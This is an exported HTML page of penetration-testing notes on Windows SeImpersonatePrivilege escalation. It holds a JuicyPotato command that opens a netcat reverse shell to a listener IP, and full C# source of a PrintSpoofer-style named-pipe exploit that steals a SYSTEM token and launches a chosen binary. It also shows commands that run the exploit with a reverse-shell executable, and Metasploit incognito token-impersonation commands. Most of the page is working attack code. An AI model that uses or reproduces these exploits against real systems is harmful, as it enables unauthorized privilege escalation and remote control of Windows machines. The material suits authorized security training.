<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>seimpersonate exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>seimpersonate exploit</h1><br/><p><strong><h2>Intro</h2></strong><ul><li>allow us to impersonate any token for which we can get a reference</li><li>by default on builtin acounts<ul><li>network service </li><li>local service</li><li>default IIS </li></ul></li><li>DUPLICATETOKENEX : create a primary token from an impersonation tokenand create a new process in the contexte of the user <ul><li>exploit via pipes </li></ul></li></ul></p><p><h2>Vulns/versions</h2></p><p><strong>.</strong><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">##If the machine is either Windows 7, 8, 10 or Windows Server 2008 and 2012, try Hot Potato.</span><br /><br /><span style="color:#0088ff;font-weight:400">##If the machine is either &lt; Windows 10 1809 or &lt; Windows Server 2019, try Juicy Potato</span><br /><span style="color:#0088ff;font-weight:400">### search clsid here https://github.com/ohpe/juicy-potato/tree/master/CLSID</span><br />JuicyPotato.exe <span style="color:#ff9d00;font-weight:700">-</span>l <span style="color:#333333;font-weight:400">1337</span> <span style="color:#ff9d00;font-weight:700">-</span>p c<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>system32<span style="color:#ff9d00;font-weight:700">\</span>cmd.exe <span style="color:#ff9d00;font-weight:700">-</span>a <span style="color:#3ad900;font-weight:400">&quot;/c C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe &lt;LISTENING_IP&gt; &lt;LISTENING_PORT&gt;&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#ff9d00;font-weight:700">*</span> <span style="color:#ff9d00;font-weight:700">-</span>c {<span style="color:#00117f;font-weight:400">F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4</span>}<br /><br /><span style="color:#0088ff;font-weight:400">## • If the machine is either &gt;= Windows 10 1809 or &gt;= Windows Server 2019, try Rogue Potato</span><br />https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>antonioCoco<span style="color:#ff9d00;font-weight:700">/</span>RoguePotato<br />https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>antonioCoco<span style="color:#ff9d00;font-weight:700">/</span>RemotePotato0<br /><br /><span style="color:#0088ff;font-weight:400"># For more updated versions, try PrintSpoofer.</span></pre></div></p><p></p><p></p><p><h2>Seimpersonate exploit</h2><ul><li><small>the attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.</small></li><li><a href="https://raw.githubusercontent.com/chvancooten/OSEP-Code-Snippets/main/PrintSpoofer.NET/Program.cs">https://raw.githubusercontent.com/chvancooten/OSEP-Code-Snippets/main/PrintSpoofer.NET/Program.cs</a></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Security.Principal;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Text;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> PrintSpoofer<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_ACCESS_DUPLEX = <span style="color:#ff0044;font-weight:400">0x3</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_TYPE_BYTE = <span style="color:#ff0044;font-weight:400">0x0</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_WAIT = <span style="color:#ff0044;font-weight:400">0x0</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKEN_ALL_ACCESS = <span style="color:#ff0044;font-weight:400">0xF01FF</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKENUSER = <span style="color:#ff0044;font-weight:400">1</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SECURITY_IMPERSONATION = <span style="color:#ff0044;font-weight:400">2</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKEN_PRIMARY = <span style="color:#ff0044;font-weight:400">1</span>;<br /><br />        [StructLayout(LayoutKind.Sequential)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> PROCESS_INFORMATION<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hProcess;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hThread;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">int</span> dwProcessId;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">int</span> dwThreadId;<br />        }<br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> STARTUPINFO<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 cb;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpReserved;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpDesktop;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpTitle;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwX;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwY;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwXSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwYSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwXCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwYCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwFillAttribute;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwFlags;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int16 wShowWindow;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int16 cbReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr lpReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdInput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdOutput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdError;<br />        }<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">enum</span> CreationFlags<br />        {<br />            DefaultErrorMode = <span style="color:#ff0044;font-weight:400">0x04000000</span>,<br />            NewConsole = <span style="color:#ff0044;font-weight:400">0x00000010</span>,<br />            NewProcessGroup = <span style="color:#ff0044;font-weight:400">0x00000200</span>,<br />            SeparateWOWVDM = <span style="color:#ff0044;font-weight:400">0x00000800</span>,<br />            Suspended = <span style="color:#ff0044;font-weight:400">0x00000004</span>,<br />            UnicodeEnvironment = <span style="color:#ff0044;font-weight:400">0x00000400</span>,<br />            ExtendedStartupInfoPresent = <span style="color:#ff0044;font-weight:400">0x00080000</span><br />        }<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">enum</span> LogonFlags<br />        {<br />            WithProfile = <span style="color:#ff0044;font-weight:400">1</span>,<br />            NetCredentialsOnly<br />        }<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateNamedPipe(<span style="color:#7f0044;font-weight:400">string</span> lpName, <span style="color:#7f0044;font-weight:400">uint</span> dwOpenMode, <span style="color:#7f0044;font-weight:400">uint</span> dwPipeMode, <span style="color:#7f0044;font-weight:400">uint</span> nMaxInstances, <span style="color:#7f0044;font-weight:400">uint</span> nOutBufferSize, <span style="color:#7f0044;font-weight:400">uint</span> nInBufferSize, <span style="color:#7f0044;font-weight:400">uint</span> nDefaultTimeOut, IntPtr lpSecurityAttributes);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;Advapi32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ImpersonateNamedPipeClient(IntPtr hNamedPipe);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> OpenThreadToken(IntPtr ThreadHandle, <span style="color:#7f0044;font-weight:400">uint</span> DesiredAccess, <span style="color:#7f0044;font-weight:400">bool</span> OpenAsSelf, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr TokenHandle);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetCurrentThread();<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Unicode)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, <span style="color:#7f0044;font-weight:400">string</span> lpApplicationName, <span style="color:#7f0044;font-weight:400">string</span> lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, <span style="color:#7f0044;font-weight:400">string</span> lpCurrentDirectory, [In] <span style="color:#ff9d00;font-weight:700">ref</span> STARTUPINFO lpStartupInfo, <span style="color:#ff9d00;font-weight:700">out</span> PROCESS_INFORMATION lpProcessInformation);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, CharSet = CharSet.Auto, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">bool</span> DuplicateTokenEx(IntPtr hExistingToken, <span style="color:#7f0044;font-weight:400">uint</span> dwDesiredAccess, IntPtr lpTokenAttributes, <span style="color:#7f0044;font-weight:400">uint</span> ImpersonationLevel, <span style="color:#7f0044;font-weight:400">uint</span> TokenType, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr phNewToken);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> RevertToSelf();<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">uint</span> GetSystemDirectory([Out] StringBuilder lpBuffer, <span style="color:#7f0044;font-weight:400">uint</span> uSize);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;userenv.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateEnvironmentBlock(<span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpEnvironment, IntPtr hToken, <span style="color:#7f0044;font-weight:400">bool</span> bInherit);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// Parse arguments (pipe name)</span><br />            <span style="color:#ff9d00;font-weight:700">if</span> (args.Length != <span style="color:#ff0044;font-weight:400">2</span>)<br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Please enter the pipe name to be used and the binary to trigger as arguments.\nExample: .\\PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss c:\\windows\\tasks\\bin.exe&quot;</span>);<br />                <span style="color:#ff9d00;font-weight:700">return</span>;<br />            }<br />            <span style="color:#7f0044;font-weight:400">string</span> pipeName = args[<span style="color:#ff0044;font-weight:400">0</span>];<br />            <span style="color:#7f0044;font-weight:400">string</span> binToRun = args[<span style="color:#ff0044;font-weight:400">1</span>];<br /><br />            <span style="color:#0088ff;font-weight:400">// Create our named pipe</span><br />            IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, <span style="color:#ff0044;font-weight:400">10</span>, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br /><br />            <span style="color:#0088ff;font-weight:400">// Connect to our named pipe and wait for another client to connect</span><br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Waiting for client to connect to named pipe...&quot;</span>);<br />            <span style="color:#7f0044;font-weight:400">bool</span> result = ConnectNamedPipe(hPipe, IntPtr.Zero);<br /><br />            <span style="color:#0088ff;font-weight:400">// Impersonate the token of the incoming connection</span><br />            result = ImpersonateNamedPipeClient(hPipe);<br /><br />            <span style="color:#0088ff;font-weight:400">// Open a handle on the impersonated token</span><br />            IntPtr tokenHandle;<br />            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, <span style="color:#ff0044;font-weight:400">false</span>, <span style="color:#ff9d00;font-weight:700">out</span> tokenHandle);<br /><br />            <span style="color:#0088ff;font-weight:400">// Duplicate the stolen token</span><br />            IntPtr sysToken = IntPtr.Zero;<br />            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, <span style="color:#ff9d00;font-weight:700">out</span> sysToken);<br /><br />            <span style="color:#0088ff;font-weight:400">// Create an environment block for the non-interactive session</span><br />            IntPtr env = IntPtr.Zero;<br />            <span style="color:#7f0044;font-weight:400">bool</span> res = CreateEnvironmentBlock(<span style="color:#ff9d00;font-weight:700">out</span> env, sysToken, <span style="color:#ff0044;font-weight:400">false</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get the impersonated identity and revert to self to ensure we have impersonation privs</span><br />            String name = WindowsIdentity.GetCurrent().Name;<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Impersonated user is: {name}.&quot;</span>);<br />            RevertToSelf();<br /><br />            <span style="color:#0088ff;font-weight:400">// Get the system directory</span><br />            StringBuilder sbSystemDir = <span style="color:#ff9d00;font-weight:700">new</span> StringBuilder(<span style="color:#ff0044;font-weight:400">256</span>);<br />            <span style="color:#7f0044;font-weight:400">uint</span> res1 = GetSystemDirectory(sbSystemDir, <span style="color:#ff0044;font-weight:400">256</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Spawn a new process with the duplicated token, a desktop session, and the created profile</span><br />            PROCESS_INFORMATION pInfo = <span style="color:#ff9d00;font-weight:700">new</span> PROCESS_INFORMATION();<br />            STARTUPINFO sInfo = <span style="color:#ff9d00;font-weight:700">new</span> STARTUPINFO();<br />            sInfo.cb = Marshal.SizeOf(sInfo);<br />            sInfo.lpDesktop = <span style="color:#3ad900;font-weight:400">&quot;WinSta0\\Default&quot;</span>;<br />            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, <span style="color:#ff0044;font-weight:700">null</span>, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), <span style="color:#ff9d00;font-weight:700">ref</span> sInfo, <span style="color:#ff9d00;font-weight:700">out</span> pInfo);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Executed &#39;{binToRun}&#39; with impersonated token!&quot;</span>);<br />        }<br />    }<br />}</pre></div></p><p><ul><li><small>It’s now time to test our application leveraging the print spooler service. </small></li><li><small> MS-RPRN works through named pipes and the pipe name used by the print spooler service is \pipe\spoolss</small></li></ul></p><p></p><p><div class="codebox"><pre>PrintSpooferNet.exe <span style="color:#ff9d00;font-weight:700">\\</span>.<span style="color:#ff9d00;font-weight:700">\</span>pipe<span style="color:#ff9d00;font-weight:700">\</span>test<span style="color:#ff9d00;font-weight:700">\</span>pipe<span style="color:#ff9d00;font-weight:700">\</span>spoolss c<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>tasks<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe<br /><span style="color:#0088ff;font-weight:400"># Invoke SpoolSample to trigger the change notification against the capture server ($target/pipe/test)</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>SpoolSample.exe appsrv01 appsrv01<span style="color:#ff9d00;font-weight:700">/</span>pipe<span style="color:#ff9d00;font-weight:700">/</span>test<br /><br /><span style="color:#0088ff;font-weight:400">## note naming is related to some weird config and to avoid same pool sample name </span><br />appsrv01 <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$target</span>  from another controlled machine</pre></div></p><p></p><p></p><p><h2>Impersonation with Incognito (metasploit)</h2><ul><li>issue could be detected by AV </p><p></li></ul><div class="codebox"><pre>load incognito<br /><span style="color:#ff9d00;font-weight:700">help</span> incognito<br />list_tokens -u<br />impersonate_token corp1<span style="color:#333333;font-weight:400">\\</span>admin<br />getuid</pre></div></p><p></p><p></p><p><img src="images/404-1.png" alt="images/404-1.png" /></p></div>
</body>
</html>
